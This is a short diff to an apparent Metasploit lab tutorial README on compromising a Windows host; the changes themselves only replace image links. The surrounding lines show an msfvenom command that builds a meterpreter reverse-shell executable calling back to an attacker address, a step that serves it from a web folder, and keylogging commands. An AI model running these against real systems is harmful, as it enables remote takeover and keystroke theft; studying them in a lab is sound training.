@@ -40,7 +40,8 @@ msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.2 -f exe > fun.exe
 
 
 copy the fun.exe into the apache /var/www/html folder
-![image](https://github.com/Saranyaaav/Compromising-windows-using-Metasploit/assets/144870813/78eec3c6-ce33-411a-b59d-3e073f3efbbd)
+![image](https://github.com/Saranyaaav/Compromising-windows-using-Metasploit/assets/144870813/9f385df1-7ef6-4664-bd71-b40a05cdc9a9)
+
 
 
 
@@ -119,6 +120,7 @@ keyscan_start	Begins capturing keys typed in the target. On the Windows target, 
 
 
 keyscan_dump	Shows the keystrokes captured so far
+
 ![image](https://github.com/Saranyaaav/Compromising-windows-using-Metasploit/assets/144870813/3ad1d31f-f013-4b1f-923a-6625c4e2a0ba)
 
 
